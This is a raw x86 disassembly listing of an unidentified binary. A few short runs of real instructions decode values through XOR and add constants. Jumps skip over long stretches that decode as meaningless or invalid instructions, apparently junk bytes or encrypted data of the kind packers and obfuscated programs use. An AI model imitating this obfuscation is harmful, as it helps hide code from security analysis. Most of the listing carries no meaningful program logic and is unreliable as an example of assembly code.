  410ab6:	or     dh,ah
  410ab8:	sub    ah,BYTE PTR [ebp-0x1e417c90]
  410abe:	ins    DWORD PTR es:[edi],dx
  410abf:	or     edx,DWORD PTR [esp+edx*4-0x6c0e2f47]
  410ac6:	xlat   BYTE PTR ds:[ebx]
  410ac7:	add    eax,DWORD PTR [ebp+0x8]
  410aca:	mov    DWORD PTR [ebp-0x10],eax
  410acd:	mov    eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fdivr  QWORD PTR [edx]
  410af2:	sub    al,0xa9
  410af4:	adc    DWORD PTR cs:[ebp+0x7c],eax
  410af8:	jl     0x410b0c
  410afa:	jg     0x410b78
  410afc:	jl     0x410b06
  410afe:	ss cli 
  410b00:	call   FWORD PTR [edx+0x7f402964]
  410b06:	inc    edi
  410b07:	and    DWORD PTR [ecx],edx
  410b09:	test   al,0x95
  410b0b:	sbb    al,BYTE PTR ds:0xa436756a
  410b11:	rol    dh,1
  410b13:	fild   QWORD PTR [edi+0x2f19030]
  410b19:	arpl   WORD PTR [ebp-0x22],cx
  410b1c:	test   ebp,edi
  410b1e:	jo     0x410b4c
  410b20:	fidivr WORD PTR [ebp+eax*8+0x14]
  410b24:	test   al,0x9b
  410b26:	add    eax,0x13898cec
  410b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b2c:	sbb    al,0xb4
  410b2e:	test   BYTE PTR [edi-0x58],ch
  410b31:	shl    BYTE PTR [edx+0x43e8f7df],0x3f
  410b38:	(bad)  
  410b3a:	adc    al,0xf
  410b3c:	mov    ds:0x5666c61c,eax
  410b41:	mov    dl,0xc0
  410b43:	js     0x410ba1
  410b45:	fisttp QWORD PTR [ebx-0x6a166302]
  410b4b:	cli    
  410b4c:	jle    0x410b06
  410b4e:	add    cl,dl
  410b50:	pop    ecx
  410b51:	push   edx
  410b52:	adc    esp,esi
  410b54:	sub    al,0x3d
  410b56:	xchg   ebp,eax
  410b57:	cdq    
  410b58:	xrelease mov BYTE PTR [edx-0x1103b3f5],dl
  410b5f:	lods   al,BYTE PTR ds:[esi]
  410b60:	push   0xc5e69d9d
  410b65:	mov    edx,0xebf432be
  410b6a:	xchg   edi,eax
  410b6b:	xor    DWORD PTR [ecx],edx
  410b6d:	es push ebx
  410b6f:	stos   BYTE PTR es:[edi],al
  410b70:	adc    BYTE PTR [esi+0x3ce5ecc3],dh
  410b76:	cmp    DWORD PTR ds:[edx+0x700e4591],esi
  410b7d:	adc    al,0x49
  410b7f:	ds pushf 
  410b81:	push   ecx
  410b82:	shr    BYTE PTR [eax-0x39aabb5],0x42
  410b89:	mov    BYTE PTR [eax-0x467ddc11],0x7b
  410b90:	loopne 0x410bee
  410b92:	pop    es
  410b93:	enter  0x9075,0xd1
  410b97:	xor    dh,BYTE PTR [edi+0x49]
  410b9a:	daa    
  410b9b:	std    
  410b9c:	xchg   ebp,eax
  410b9d:	push   ebx
  410b9e:	(bad)  
  410b9f:	mov    eax,esi
  410ba1:	xlat   BYTE PTR ds:[ebx]
  410ba2:	mov    esi,0xe91f9f5a
  410ba7:	(bad)  
  410ba8:	mov    edi,0x8372512d
  410bad:	sub    ecx,DWORD PTR [edi]
  410baf:	(bad)  
  410bb0:	mov    cl,0x6e
  410bb2:	sub    esp,DWORD PTR [ebx+0x6a]
  410bb5:	add    eax,0x8ed26c7f
  410bba:	into   
  410bbb:	mov    esp,0x60961881
  410bc0:	jle    0x410bdf
  410bc2:	test   BYTE PTR [eax-0x7b11a149],ah
  410bc8:	push   eax
  410bc9:	(bad)
  410bcd:	(bad)  
  410bce:	pop    ds
  410bcf:	cwde   
  410bd0:	iret   
  410bd1:	dec    esp
  410bd2:	adc    bl,BYTE PTR [ebx+ebx*1-0x6b]
  410bd6:	outs   dx,BYTE PTR cs:[esi]
  410bd8:	clc    
  410bd9:	mov    eax,ds:0x521f21ff
  410bde:	stos   BYTE PTR es:[edi],al
  410bdf:	jb     0x410c48
  410be1:	xchg   ecx,eax
  410be2:	jle    0x410bb5
  410be4:	int    0x76
  410be6:	test   eax,0xf3e55c3e
  410beb:	xchg   BYTE PTR [edx-0x388f43a3],ah
  410bf1:	les    eax,FWORD PTR [edi-0x2a]
  410bf4:	push   esp
  410bf5:	xchg   esi,eax
  410bf6:	push   ebp
  410bf7:	repnz cwde 
  410bf9:	in     al,0xf2
  410bfb:	dec    ecx
  410bfc:	and    DWORD PTR [eax+0x440bca2a],esi
  410c02:	push   cs
  410c03:	scas   al,BYTE PTR es:[edi]
  410c04:	fadd   st,st(4)
  410c06:	aad    0x22
  410c08:	in     eax,0xc1
  410c0a:	inc    edx
  410c0b:	fdiv   DWORD PTR [ebx-0x5a]
  410c0e:	fild   DWORD PTR [esi]
  410c10:	cmp    DWORD PTR [eax+0x1cb02ee1],edx
  410c16:	stc    
  410c17:	mov    cl,0x80
  410c19:	or     eax,DWORD PTR [edx-0x3478a4b7]
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	sti    
  410c86:	in     eax,dx
  410c87:	lock (bad) 
  410c89:	aaa    
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410d0f
  410c92:	mov    BYTE PTR [edx+0x30],ah
  410c95:	push   ds
  410c96:	dec    ebx
  410c97:	imul   ebx,DWORD PTR [edx],0x60d40c8f
  410c9d:	loop   0x410c2f
  410c9f:	nop    DWORD PTR [eax+0x14fe279d]
  410ca6:	popa   
  410ca7:	inc    BYTE PTR [ebx+0x74]
  410caa:	(bad)  
  410cab:	int3   
  410cac:	xchg   ebp,eax
  410cad:	add    DWORD PTR [edx+0x4d9cd5c5],eax
  410cb3:	push   esp
  410cb4:	xchg   BYTE PTR [edi-0x48],ah
  410cb7:	inc    ebp
  410cb8:	in     eax,0x45
  410cba:	pop    eax
  410cbb:	hlt    
  410cbc:	pop    ecx
  410cbd:	(bad)  
  410cbe:	aaa    
  410cbf:	test   DWORD PTR [edx+0x41],ecx
  410cc2:	(bad)  [ebp-0x1a677e15]
  410cc8:	push   0x22ddb5f1
  410ccd:	scas   al,BYTE PTR es:[edi]
  410cce:	pop    esi
  410ccf:	inc    ecx
  410cd0:	sub    ah,BYTE PTR [eax]
  410cd2:	jns    0x410c93
  410cd4:	push   cs
  410cd5:	mov    WORD PTR [ebp+0x55fbbcd4],fs
  410cdb:	int    0x2
  410cdd:	repz mov ds:0x78f67190,al
  410ce3:	cmc    
  410ce4:	or     eax,0x49713f3b
  410ce9:	dec    BYTE PTR [edx+eax*8+0x31]
  410ced:	stc    
  410cee:	pop    ss
  410cef:	add    DWORD PTR [esp+eiz*8],edx
  410cf2:	fsub   QWORD PTR [esi]
  410cf4:	icebp  
  410cf5:	leave  
  410cf6:	ins    DWORD PTR es:[edi],dx
  410cf7:	(bad)  [edx+0x30fbbabc]
  410cfd:	inc    esi
  410cfe:	add    eax,eax
  410d00:	adc    dh,dh
  410d02:	imul   edx,DWORD PTR [edi],0xffffffe4
  410d05:	add    bl,BYTE PTR [ecx]
  410d07:	and    eax,0xe80febb0
  410d0c:	(bad)  
  410d0d:	ds push edi
  410d0f:	nop
  410d10:	or     ebx,eax
  410d12:	scas   eax,DWORD PTR es:[edi]
  410d13:	jle    0x410c9a
  410d15:	sub    eax,0x6a4a642
  410d1a:	xor    al,0x74
  410d1c:	pushf  
  410d1d:	cmp    eax,0x5bee84e0
  410d22:	sbb    al,0xd4
  410d24:	in     al,0xfa
  410d26:	div    DWORD PTR [edi]
  410d28:	xchg   esi,eax
  410d29:	pop    edx
  410d2a:	jl     0x410d09
  410d2c:	dec    esi
  410d2d:	dec    edi
  410d2e:	ds retf 
  410d30:	pop    edi
  410d31:	xchg   edx,eax
  410d32:	cmp    BYTE PTR [esi+0x434adc3f],ah
  410d38:	add    dl,BYTE PTR [esi+0x2c]
  410d3b:	cmp    al,0x57
  410d3d:	frstor [edi+0x6f99c849]
  410d43:	adc    ecx,ebp
  410d45:	ror    BYTE PTR [eax],cl
  410d47:	lds    ebp,FWORD PTR [ecx]
  410d49:	retf   0xe702
  410d4c:	jno    0x410d79
  410d4e:	and    BYTE PTR [ebp+0x748ac1ef],dl
  410d54:	int    0x3e
  410d56:	xchg   ecx,eax
  410d57:	inc    edx
  410d58:	in     al,dx
  410d59:	inc    ecx
  410d5a:	int    0x37
  410d5c:	cmp    DWORD PTR [ebp*4+0x4c98aba7],edx
  410d63:	mov    ebp,eax
  410d65:	sub    al,0xc7
  410d67:	sbb    DWORD PTR [ecx+eax*8],edi
  410d6a:	push   ecx
  410d6b:	xchg   esi,eax
  410d6c:	sub    esp,eax
  410d6e:	call   0x1a58d2d
  410d73:	push   esp
  410d74:	(bad)  
  410d75:	ins    BYTE PTR es:[edi],dx
  410d76:	pop    es
  410d77:	sbb    eax,0xd08a1711
  410d7c:	cdq    
  410d7d:	jmp    0xc8c10060
  410d82:	mov    eax,ds:0x8231fa4
  410d87:	jnp    0x410dd4
  410d89:	adc    DWORD PTR [eax],esp
  410d8b:	push   eax
  410d8c:	fmul   QWORD PTR [esi+0x7cf78129]
  410d92:	push   cs
  410d93:	pop    ebx
  410d94:	and    al,0xbb
  410d96:	jno    0x410d9f
  410d98:	cld    
  410d99:	daa    
  410d9a:	scas   al,BYTE PTR es:[edi]
  410d9b:	mov    ah,0x54
  410d9d:	mov    ecx,0xe21336aa
  410da2:	jns    0x410e16
  410da4:	outs   dx,DWORD PTR ds:[esi]
  410da5:	into   
  410da6:	add    DWORD PTR [ebx],eax
  410da8:	retf   0x81a4
  410dab:	sub    eax,0xb9b2f2f9
  410db0:	push   ebx
  410db1:	or     BYTE PTR [ecx+0x7],dl
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x6c6f7300],esi
  410e04:	dec    ebp
  410e05:	aad    0x47
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410e45
  410e0e:	in     eax,0xc
  410e10:	jb     0x410e54
  410e12:	lods   al,BYTE PTR ds:[esi]
  410e13:	and    cl,bl
  410e15:	fsub   DWORD PTR [edx-0xb]
  410e18:	xchg   ch,ch
  410e1a:	adc    eax,DWORD PTR [esp+ebx*4+0x55]
  410e1e:	call   0xa189f224
  410e23:	add    DWORD PTR [esi-0x62],ecx
  410e26:	dec    ecx
  410e27:	inc    edx
  410e28:	and    BYTE PTR [ebp-0x21],ah
  410e2b:	xor    dh,ah
  410e2d:	lds    esp,FWORD PTR [ecx-0x74b1845]
  410e33:	fadd   st,st(5)
  410e35:	jmp    0x410e0b
  410e37:	cmc    
  410e38:	sbb    esi,DWORD PTR [ecx]
  410e3a:	daa    
  410e3b:	jp     0x410e98
  410e3d:	ds jmp 0x410dd5
  410e40:	lea    esp,[eax]
  410e42:	retf   0x3034
  410e45:	mov    edi,0x2afef502
  410e4a:	mov    ds,WORD PTR [eax+eax*2-0x42]
  410e4e:	aas    
  410e4f:	test   DWORD PTR [edi],0xa64f735c
  410e55:	hlt    
  410e56:	xchg   ecx,eax
  410e57:	les    eax,FWORD PTR [edi+0x76197f3d]
  410e5d:	mov    ebp,0x364ea884
  410e62:	nop
  410e63:	mov    ebx,0xaa93e1ce
  410e68:	gs je  0x410e56
  410e6b:	mov    DWORD PTR [edx],edi
  410e6d:	mov    esp,0x8d7c4b19
  410e72:	inc    esi
  410e73:	lods   eax,DWORD PTR ds:[esi]
  410e74:	jg     0x410ecd
  410e76:	imul   esp,DWORD PTR [edx],0xffffffe2
  410e79:	push   ds
  410e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e7b:	push   cs
  410e7c:	lds    eax,FWORD PTR [esi-0x4a]
  410e7f:	push   es
  410e80:	inc    ebx
  410e81:	pop    esi
  410e82:	push   eax
  410e83:	sti    
  410e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e85:	xchg   edi,eax
  410e86:	mul    BYTE PTR [esi+eiz*8+0xeba338]
  410e8d:	cld    
  410e8e:	xchg   ebx,eax
  410e8f:	repnz xchg esi,eax
  410e91:	inc    edx
  410e92:	enter  0xc446,0xf0
  410e96:	inc    edx
  410e97:	fwait
  410e98:	pop    ebp
  410e99:	push   0xffffffd5
  410e9b:	jmp    DWORD PTR [edx]
  410e9d:	mov    edx,0x377284d
  410ea2:	call   0xa3197ad3
  410ea7:	jne    0x410ee5
  410ea9:	push   esp
  410eaa:	movsx  edi,WORD PTR [esi+edi*4-0x11f51eb2]
  410eb2:	(bad)  
  410eb3:	jecxz  0x410f05
  410eb5:	mov    ebp,0x6e39d3e7
  410eba:	ds aas 
  410ebc:	push   ecx
  410ebd:	add    DWORD PTR [eax],esp
  410ebf:	hlt    
  410ec0:	in     eax,dx
  410ec1:	cmp    BYTE PTR [ebp-0x70767c6b],ch
  410ec7:	(bad)  
  410ec8:	clc    
  410ec9:	jge    0x410f1e
  410ecb:	rol    DWORD PTR [ebx+0x2c],0xa9
  410ecf:	test   BYTE PTR [eax+0x793962a7],dl
  410ed5:	xor    eax,0x98b0a6df
  410eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410edb:	ins    BYTE PTR es:[edi],dx
  410edc:	add    bl,BYTE PTR ds:0x295e1c64
  410ee2:	mul    DWORD PTR ds:0xd10081c2
  410ee8:	mov    eax,ds:0x2e6f0a74
  410eed:	lods   al,BYTE PTR ds:[esi]
  410eee:	fild   QWORD PTR [eax+0x67c7f256]
  410ef4:	and    BYTE PTR [edi+ebx*4+0x23da187e],ch
  410efb:	addr16 sbb al,0xd3
  410efe:	or     BYTE PTR [esi+0x59],0x26
  410f02:	xchg   esp,eax
  410f03:	in     al,dx
  410f04:	jecxz  0x410eb6
  410f06:	lahf   
  410f07:	nop
  410f08:	mov    edi,0x12ad6daa
  410f0d:	jg     0x410f61
  410f0f:	sub    dl,BYTE PTR [edi]
  410f11:	out    0x23,al
  410f13:	out    dx,eax
  410f14:	xchg   ebp,eax
  410f15:	pop    ss
  410f16:	in     al,0x6d
  410f18:	fwait
  410f19:	or     BYTE PTR [ecx+0x3a],ah
  410f1c:	addr16 inc esp
  410f1e:	bound  ebx,QWORD PTR [ebx+0x55]
  410f21:	adc    ebx,DWORD PTR [ecx+eiz*4-0x13843273]
  410f28:	xlat   BYTE PTR ds:[ebx]
  410f29:	in     al,0xdb
  410f2b:	add    eax,esi
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	(bad)  
  410f4a:	outs   dx,DWORD PTR ds:[esi]
  410f4b:	int3   
  410f4c:	sbb    al,0xeb
  410f4e:	inc    esi
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410f01
  410f56:	dec    ecx
  410f57:	imul   eax,ebx,0xd756bc2e
  410f5d:	pop    ds
  410f5e:	dec    ebp
  410f5f:	sub    esi,edx
  410f61:	cmp    eax,0x708cacde
  410f66:	jns    0xa3203ada
  410f6c:	mov    esp,0x140589c5
  410f71:	(bad)  
  410f72:	fcom   st(4)
  410f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f75:	rcr    BYTE PTR [edi],1
  410f77:	in     al,dx
  410f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f79:	and    DWORD PTR [ecx-0xf],esp
  410f7c:	jg     0x410f94
  410f7e:	push   eax
  410f7f:	int    0xcd
  410f81:	in     eax,0xe9
  410f83:	cwde   
  410f84:	dec    esi
  410f85:	push   cs
  410f86:	xchg   edi,eax
  410f87:	mov    cl,0x56
  410f89:	int3   
  410f8a:	and    DWORD PTR [bx+di],0xfffffff9
  410f8e:	mov    esi,0x12f82b60
  410f93:	mov    gs,edi
  410f95:	ja     0x410f36
  410f97:	mov    bh,0x8
  410f99:	aaa    
  410f9a:	popa   
  410f9b:	and    al,0x87
  410f9d:	xor    al,BYTE PTR [ebp+esi*8-0x260e98f5]
  410fa4:	pop    edi
  410fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fa6:	mov    eax,ds:0xe4829
  410fab:	pop    esi
  410fac:	pop    edi
  410fad:	xchg   DWORD PTR [ebx-0xa],ebp
  410fb0:	repz pop ss
  410fb2:	inc    ecx
  410fb3:	ja     0x410fd9
  410fb5:	jno    0x410fee
  410fb7:	dec    ebx
  410fb8:	sbb    cl,BYTE PTR [eax+0x79]
  410fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fbc:	ds cdq 
  410fbe:	in     eax,dx
  410fbf:	xor    BYTE PTR [ebx-0x1a],ch
  410fc2:	stc    
  410fc3:	sbb    DWORD PTR [ebx-0x4c],esi
  410fc6:	(bad)  
  410fc7:	pop    eax
  410fc8:	sub    BYTE PTR [eax],dl
  410fca:	inc    ebx
  410fcb:	mov    ds:0xc2d9f70a,al
  410fd0:	dec    ebp
  410fd1:	push   edx
  410fd2:	pop    ebx
  410fd3:	js     0x411000
  410fd5:	or     bh,bl
  410fd7:	mov    dl,0xf5
  410fd9:	lock cdq 
  410fdb:	jp     0x410f76
  410fdd:	xor    edx,ebp
  410fdf:	outs   dx,DWORD PTR fs:[esi]
  410fe1:	and    edx,DWORD PTR [eax-0x20]
  410fe4:	dec    eax
  410fe5:	push   esp
  410fe6:	sub    BYTE PTR [ebx-0x30b60673],al
  410fec:	jp     0x410fea
  410fee:	loopne 0x410fcd
  410ff0:	jmp    0x3c0ac471
  410ff5:	pop    esi
  410ff6:	repz scas al,BYTE PTR es:[edi]
  410ff8:	mov    WORD PTR [esi-0x7045f735],?
  410ffe:	xchg   BYTE PTR [ebx],dh
  411000:	imul   edx,DWORD PTR [ecx-0x66e15fb7],0x78
  411007:	jg     0x411009
  411009:	dec    esp
  41100a:	mov    cl,0xdb
  41100c:	mov    edx,0x7789a082
  411011:	shr    dh,1
  411013:	sar    DWORD PTR [edx],cl
  411015:	sar    DWORD PTR [esi-0x23],cl
  411018:	mov    bh,0x7b
  41101a:	ret    0x3df4
  41101d:	and    al,0x38
  41101f:	shl    eax,1
  411021:	pop    eax
  411022:	dec    BYTE PTR [edx-0x9]
  411025:	cdq    
  411026:	loope  0x4110a5
  411028:	and    ebp,DWORD PTR [edi-0x65ef0649]
  41102e:	nop
  41102f:	or     bl,BYTE PTR [edi+ebp*4+0x3e]
  411033:	neg    BYTE PTR [esp+ecx*4+0x4d]
  411037:	sub    BYTE PTR [ebx-0x4bff89f4],cl
  41103d:	(bad)  
  41103e:	mov    ebx,0xe1642e59
  411043:	pop    edi
  411044:	les    edi,FWORD PTR [ecx-0x3]
  411047:	cmp    ecx,DWORD PTR [esi-0x48]
  41104a:	mov    esi,0x76798e7f
  41104f:	xchg   esi,eax
  411050:	mov    bl,0xcc
  411052:	int    0x7a
  411054:	in     eax,dx
  411055:	push   ecx
  411056:	fs or  eax,0x212f20eb
  41105c:	je     0x41108f
  41105e:	mov    ebx,DWORD PTR [ecx+0x58b7e16d]
  411064:	xor    dh,dl
  411066:	push   0xa5a27c27
  41106b:	cmp    cl,0x9a
  41106e:	mov    al,0x9e
  411070:	xor    eax,0x8c8d7f67
  411075:	or     bl,BYTE PTR [edx+0x3b003272]
  41107b:	enter  0x850f,0xe5
  41107f:	sti    
  411080:	(bad)  
  411081:	dec    DWORD PTR [ebx+0x5e9de]
  411087:	add    BYTE PTR [eax],al
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	shl    BYTE PTR [eax],1
  4110b3:	es and eax,0x7c7c4189
  4110b9:	adc    bh,BYTE PTR [edi+0x7c]
  4110bc:	jl     0x41110a
  4110be:	repnz mov ds:0xe196527f,eax
  4110c4:	(bad)  
  4110c5:	in     eax,dx
  4110c6:	jbe    0x41110c
  4110c8:	xchg   ebp,eax
  4110c9:	push   ss
  4110ca:	cmp    cl,BYTE PTR [edi-0x18975bed]
  4110d0:	sub    BYTE PTR [esi+edi*2+0x56e1acc7],ah
  4110d7:	fstp   QWORD PTR [ecx+ebx*8]
  4110da:	aaa    
  4110db:	sbb    eax,0x1fd5ad58
  4110e0:	jmp    0x4110b1
  4110e2:	pop    edi
  4110e3:	std    
  4110e4:	xchg   ecx,eax
  4110e5:	xchg   DWORD PTR [ebx+0x44732b26],edx
  4110eb:	cmp    esp,DWORD PTR ds:[ebp-0x8]
  4110ef:	fsub   st,st(5)
  4110f1:	or     al,0x20
  4110f3:	push   esi
  4110f4:	jae    0x411171
  4110f6:	sbb    bl,BYTE PTR [eax+ebp*1]
  4110f9:	pop    edi
  4110fa:	sti    
  4110fb:	cdq    
  4110fc:	les    ebp,FWORD PTR [ebp+0x48]
  4110ff:	gs test esp,edx
  411102:	sbb    BYTE PTR [eax-0x22],al
  411105:	bound  edx,QWORD PTR [edi-0x50ffc883]
  41110b:	inc    esi
  41110c:	mov    eax,ebp
  41110e:	mov    dh,0xd5
  411110:	arpl   ax,ax
  411112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411113:	mov    esi,0xa54b9c86
  411118:	sub    BYTE PTR [eax+0x72920f3c],dl
  41111e:	inc    ebx
  41111f:	mov    bl,0x70
  411121:	or     eax,0xfc36c1bb
  411126:	imul   esi,DWORD PTR [ebx+ecx*2+0x664ab85e],0x1b68d124
  411131:	ret    
  411132:	inc    esp
  411133:	call   0x4fcbe5a1
  411138:	retf   
  411139:	iret   
  41113a:	inc    ebp
  41113b:	ss inc ecx
  41113d:	jg     0x41116d
  41113f:	xchg   DWORD PTR [edi-0x4e],esi
  411142:	scas   eax,DWORD PTR es:[edi]
  411143:	icebp  
  411144:	sti    
  411145:	cld    
  411146:	jl     0x41117c
  411148:	pop    ecx
  411149:	mov    ah,0x49
  41114b:	imul   esi,DWORD PTR [ebx-0x1fa8e162],0xb6b561e5
  411155:	outs   dx,BYTE PTR ds:[esi]
  411156:	cli    
  411157:	scas   eax,DWORD PTR es:[edi]
  411158:	fisub  DWORD PTR [esi-0x6976c2b6]
  41115e:	mov    esi,0x88a91acd
  411163:	test   DWORD PTR [edi],esp
  411165:	xor    al,0xb5
  411167:	loope  0x41113f
  411169:	cld    
  41116a:	pop    ds
  41116b:	xlat   BYTE PTR ds:[ebx]
  41116c:	push   ebx
  41116d:	fsubp  st(6),st
  41116f:	mov    DWORD PTR [eax-0x56],esp
  411172:	pop    ds
  411173:	push   eax
  411174:	(bad)  
  411175:	fstp   DWORD PTR [edi+0x30]
  411178:	(bad)  
  411179:	and    al,0xe7
  41117b:	stos   BYTE PTR es:[edi],al
  41117c:	(bad)  
  41117e:	int    0x25
  411180:	je     0x4111a4
  411182:	lds    edi,FWORD PTR [eax+0x648dd7f]
  411188:	xor    al,0xae
  41118a:	pop    ebp
  41118b:	xor    bl,BYTE PTR [esp+ecx*8]
  41118e:	sar    bl,1
  411190:	dec    edx
  411191:	sbb    eax,0xc4f8fabd
  411196:	jne    0x411164
  411198:	ds aad 0x9
  41119b:	sub    BYTE PTR [edx-0x7298841c],dh
  4111a1:	data16 (bad) 
  4111a3:	lock jg 0x4111d7
  4111a6:	call   0xcde6:0x34e88456
  4111ad:	add    edx,DWORD PTR [eax+ebx*1+0x5e]
  4111b1:	inc    ecx
  4111b2:	and    al,0xcd
  4111b4:	mov    WORD PTR [ebp-0x1726015a],es
  4111ba:	xlat   BYTE PTR ds:[ebx]
  4111bb:	sub    eax,DWORD PTR [ebx-0x68165992]
  4111c1:	in     al,dx
  4111c2:	pop    esp
  4111c3:	add    eax,DWORD PTR [ebp+0x196fa62]
  4111c9:	xlat   BYTE PTR ds:[ebx]
  4111ca:	cli    
  4111cb:	and    ebx,ecx
  4111cd:	add    al,0xd6
  4111cf:	mov    bh,0xcf
  4111d1:	push   es
  4111d2:	in     eax,0x67
  4111d4:	push   esp
  4111d5:	push   esi
  4111d6:	mov    ah,BYTE PTR [esi+0x3fa24a0]
  4111dc:	sbb    bh,bh
  4111de:	shl    DWORD PTR [ebx],cl
  4111e0:	fild   DWORD PTR [ebx+0x39]
  4111e3:	pop    ebp
  4111e4:	adc    BYTE PTR [edi],cl
  4111e6:	test   BYTE PTR [ebx+0x1],dl
  4111e9:	add    BYTE PTR [eax],al
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0xcd5a,0xba
  4111ff:	adc    eax,0x7c40af09
  411204:	jl     0x411218
  411206:	jg     0x411284
  411208:	jl     0x4111af
  41120a:	mov    ah,0x8f
  41120c:	jns    0x411229
  41120e:	push   esi
  41120f:	shl    DWORD PTR [edi+esi*1-0x65],0x2
  411214:	mov    ds:0x5fcaee36,eax
  411219:	pop    ebp
  41121a:	dec    eax
  41121b:	and    al,0xbd
  41121d:	test   eax,0xe4586171
  411222:	and    eax,0x736da4d1
  411227:	and    DWORD PTR ds:0xe057a9a0,eax
  41122d:	mov    ecx,0x5bf2bca8
  411232:	sub    BYTE PTR [edi-0x40],0x16
  411236:	shr    dl,0xef
  411239:	test   al,0xc2
  41123b:	adc    eax,DWORD PTR [esi-0x1cb15472]
  411241:	outs   dx,BYTE PTR ds:[esi]
  411242:	push   ss
  411243:	mov    edx,0x24b40c8d
  411248:	popa   
  411249:	mov    bh,0x7
  41124b:	cdq    
  41124c:	cli    
  41124d:	pop    eax
  41124e:	jns    0x4112c3
  411250:	mov    edi,0x91db234c
  411255:	mov    eax,ds:0x7e8ce0a8
  41125a:	lock iret 
  41125c:	push   ss
  41125d:	shr    BYTE PTR [ebx],cl
  41125f:	(bad)  
  411260:	test   al,0x44
  411262:	gs ins DWORD PTR es:[edi],dx
  411264:	or     BYTE PTR [ecx+edx*2-0x4d4c71bb],dh
  41126b:	push   cs
  41126c:	and    al,0x3e
  41126e:	sbb    ebp,DWORD PTR ds:0x8ec7d187
  411274:	fstp   DWORD PTR [esi-0x7c]
  411277:	iret   
  411278:	add    eax,0xc46d4c4f
  41127d:	jnp    0x4112a8
  41127f:	inc    esi
  411280:	clc    
  411281:	loope  0x411224
  411283:	inc    esp
  411284:	mov    dh,0x64
